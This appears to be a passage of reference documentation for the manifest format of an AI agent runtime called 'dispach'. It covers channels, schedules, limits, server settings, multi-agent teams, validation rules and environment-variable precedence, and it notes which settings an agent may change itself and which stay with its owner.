| Field | Notes |
| --- | --- |
| `type` | Registered channel type. |
| `id` | Unique within the agent. Used in session keys and delivery targets. |
| `allowFrom` | Inbound allowlist. `["*"]` permits anyone. **Inbound only** — it has no effect on outbound delivery. |
| `enabled` | Default true. |

Telegram: `tokenEnv`, `mode` (`longpoll` \| `webhook`), `webhookPath`, `secretTokenEnv`.
WhatsApp: `authDir`, `printQr`.

Channel connection failures never block readiness; they surface as `agent.channel.error`.

`channels` and `delivery` are writable by the agent through `config_set`, so skipping the question in
`init` is not a dead end. **`allowFrom` is not**, and neither are `server.host` and `server.tokenEnv`:
enabling a capability is what a person asks an agent for, but who may reach it and from where are the
person's by definition — the same rule that floors `writeRoots`. A `config_set` that names a new
`tokenEnv` reports that the agent will not start until that variable is set in the `.env`, which only
a person can write.

### `delivery`

```yaml
delivery:
  default: tg
  targets:
    alerts: { channel: tg, to: "@moeen" }
```

`default` names the channel used when a turn has no originating channel — scheduled runs,
API-initiated turns.

### `schedules`

| Field | Required | Notes |
| --- | --- | --- |
| `id` | yes | Stable. Used for updates and idempotency. |
| `kind` | yes | `cron` \| `every` \| `at` |
| `expr` | yes | cron: 5 or 6 field. every: duration (`15m`, `2h`). at: ISO 8601, max +10 years. |
| `task` | yes | Prompt text for the run. |
| `deliver` | yes | `{ channel, to }` or the literal `none`. **Validated at write time** with a specific error naming what's missing. `to` is the address a reply is *sent* to — see **Addressing** below; it is not the same vocabulary as `allowFrom`. |
| `session` | no | `isolated` (default) or `shared:<key>`. `isolated` is a **fresh session per run** — `schedule:<id>:<runId>` — so a daily brief never accumulates history it was not asked to carry, and every run stays in the store as its own conversation. |
| `enabled` | no | Default true. Disabled schedules are listed by default. |
| `timezone` | no | IANA name. Defaults to `TZ` then UTC. Applies to `cron` only: `every` is interval-anchored and does not participate in DST. |
| `role` | no | A model role from `model:` to run this turn on instead of `main`. Omit for `main`. |

**Timing.** `cron` is wall-clock-anchored and `every` is interval-anchored. On a DST spring-forward a
`cron` occurrence whose local time does not exist is **skipped entirely** — a daily 02:15 does not
fire that day, not shifted and not late — and on a fall-back the repeated hour fires **exactly once**.
Scheduling between midnight and 03:00 is best avoided for that reason. `every` is unaffected by
either: `every: 24h` across a transition fires 24 hours later, an hour earlier by the clock.

Fire times carry a **deterministic offset derived from the schedule id**, at most `min(interval/10,
15 min)`, so a hundred schedules written `0 8 * * *` do not all reach an endpoint at the same instant.
It is stable across restarts rather than random, so a schedule fires at the same offset every day. A
one-shot carries none: an author who wrote an instant meant that instant.

**After downtime**, a `cron` or `every` schedule advances to its next occurrence and reports how many
it dropped; it never replays a backlog. An `at` whose moment passed fires **once, late, flagged** —
nothing else will ever fire it. A fire arriving while the previous run of the same schedule is still
going is held until that run finishes, at most one deep.

**Addressing.** `deliver.to` is an address the channel can route to, which is **not** the vocabulary
`allowFrom` uses. On Telegram, `chat_id` accepts `@name` only when it names a *channel*; a private
chat has no address but its numeric id — so `to: "@someone"` produces a schedule that fires perfectly
and returns `Bad Request: chat not found` on every send. Loading a manifest with that shape **warns
and still loads**, because `@somechannel` is a legitimate target and a heuristic that refuses to load
a file is a heuristic nobody keeps. `dispach schedules <agent> --recipients` lists the addresses this
agent has actually been reached on, which is the only trustworthy source: a bot cannot ask Telegram
for the chat id behind a handle.

Schedules declared in the manifest are reconciled into the store at load: created,
updated, or removed to match. Schedules created through the API and absent from the
manifest are left alone — the manifest owns manifest schedules only.

Reconciliation is scoped to the **manifest that wrote each row**, not merely to `origin: manifest`.
The store is keyed by agent `id`, and `id` need not equal the directory name — so two directories
declaring the same `id` share every row, and without that scope each one's load deleted the other's
schedules and the next load re-created them with a fresh anchor. A schedule reloaded more often than
its own interval then never fires at all, silently.

`schedules` is writable by the agent through `config_set`, for the same reason `channels` and
`delivery` are: "remind me every morning" is a capability request, and an agent that can only describe
the YAML makes its owner do the tedious half. `deliver.to` is settable with it — the first field where
the agent names a recipient rather than a channel — because a schedule with no addressee is not a
feature, and the message still leaves through a channel a person configured with a token only a person
can supply. The write is validated the way the runtime validates it, not merely against the schema:
`expr` is parsed, `deliver.channel` is checked against the declared channels and `role` against the
declared roles, so an edit that would be refused at the next boot is refused where it is made.

### `plugins`

```yaml
plugins:
  - "@dispach/channel-telegram"          # shorthand, no config
  - spec: "./plugins/custom-metrics"       # relative path
    config: { endpoint: "http://localhost:9090" }
```

Resolved at boot from `node_modules` or a relative path. **Never installed at runtime.**
Load order is manifest order; middleware composes outermost-first. A plugin whose
`dispachApi` range does not satisfy the host refuses to load and names both versions.

### `limits`

| Field | Default | Notes |
| --- | --- | --- |
| `maxSteps` | 40 | Steps per turn before forced termination. Hitting it emits `turn.end` with `reason: max_steps` — an honest failure, not a silent truncation. Generous, because a step budget is not a plan: real work recovers, and each recovery costs a step. A six-step budget cut a live agent off one step after it had installed the dependency it needed, its reply ending on "Let me install it". `noProgress` is what stops a loop; this only stops a runaway. |
| `noProgress.identicalCalls` | 3 | Identical consecutive tool calls — same slug **and** same arguments — before the turn ends as `reason: no_progress`. This is the guard a small `maxSteps` was standing in for, and it is better at the job: the same call with the same arguments cannot return a different answer, so the remaining steps would only repeat it. Two is a retry, which is often correct; three is a pattern. Compared before the calls run, because a loop that has already executed twice has had its side effects twice. |
| `turnTimeoutMs` | 1800000 | 30 min. Must exceed any upstream timeout on the model endpoint. |
| `toolTimeoutMs` | 120000 | Per tool execution. |
| `maxParallelTools` | 4 | Read-only tools only; mutating tools always serialise. |

### `server`

| Field | Default | Notes |
| --- | --- | --- |
| `enabled` | false | Library use needs no server. |
| `port` | 7420 | |
| `host` | `127.0.0.1` | Binds loopback by default. Public binding is explicit. |
| `tokenEnv` | `DISPACH_API_TOKEN` | Bearer token env var name. Server refuses to start on a non-loopback host without a token. |

---

## Multi-agent manifests

A runtime-level file lists agents and declares the team:

```yaml
apiVersion: dispach/v1
kind: Runtime
agents:
  - ./agents/supervisor.yaml
  - ./agents/researcher.yaml
  - ./agents/writer.yaml
team:
  supervisor: supervisor
  members: [researcher, writer]
```

The supervisor gets the `handoff` local tool. Members do not, unless they declare their own
team — nesting is permitted but each level must be declared explicitly.

---

## Validation rules

Enforced by `manifest/validate.ts`, all failing at load with a field path and a fix hint:

1. `apiVersion` must be exactly `dispach/v1`.
2. Secrets must be `*Env` references. A literal-looking key (`sk-`, `Bearer`, 32+ char hex) in a value fails.
3. `context.thresholds` must be strictly ascending **in stage order** — `snip → micro → collapse →
   reset → trim` — and within `(0, 1)`. They are fractions of the prompt budget,
   `window - reserveOutput`. Values ordered for the old ladder (`trim` first) are refused as
   `manifest_thresholds_legacy_order`, which names the rewrite rather than blaming a field.
4. `tools.budget.reserveWrite` must be less than `budget.max`.
5. Every `pinned` slug must resolve against the provider.
6. Every `phases.*.allow` entry must match at least one resolved tool, or be `*`.
7. Exactly one phase may be `entry: true`.
8. Every schedule must have a `deliver` target or explicit `none`.
9. Every `channels[].id` referenced by `delivery` must exist.
10. `context.files` must all exist and be readable.
11. `reserveOutput` must be less than `window`.
12. Plugin `dispachApi` ranges must satisfy the host version.

Rule 2 exists because a manifest is a file people paste into issues.

---

## Environment expansion

`${VAR}` expands anywhere in a string value, at load, from `process.env`. An unset variable
referenced in a required field fails the load naming the variable — it does not expand to
an empty string and fail later as a confusing auth error.

**Use it for secrets, and prefer a literal for everything else.** `apiKeyEnv` names a variable
because a key must never be in the file; `model.main.id` and `model.main.baseUrl` are facts about
the agent and belong in the file a person reads to understand it. A generated manifest writes them
literally. Behind a variable they cost three things: `readManifestHeader` does not expand (so every
agent listed as `${MODEL_ID}` and the picker could not tell two apart), any `.env` on the machine
could change which model ran — and with it the resolved `contextWindow`, `thinking` and
`promptStyle`, since all three derive from the id — and `validate` checked whichever agent the
ambient environment happened to describe. Expansion still works everywhere; it is not the default.

`.env` next to the manifest is loaded if present. Real environment always wins — an operator's
explicit export has to beat a committed file, or a container cannot configure the agent it runs.

Precedence under the `dispach` binary is **export → the agent's own `.env` → a `.env` in the
directory the command was run from**. The last of those is demoted by the CLI before core sees it: a
`.env` file configures its own project, and an agent living in the home sandbox is not part of that
project. An embedder gets core's plain rule, where a container's environment wins.

**A variable where the two disagree is reported**, as an `env_overridden` warning on the agent,
naming it and showing both values (values withheld when the name looks like a secret). The layering
is right and the silence was not: an agent whose own `.env` named one model ran a whole session on
another because the binary was launched from a directory whose `.env` said so, and the banner
reported the model actually in use — correct, and useless to whoever had just written the other one.
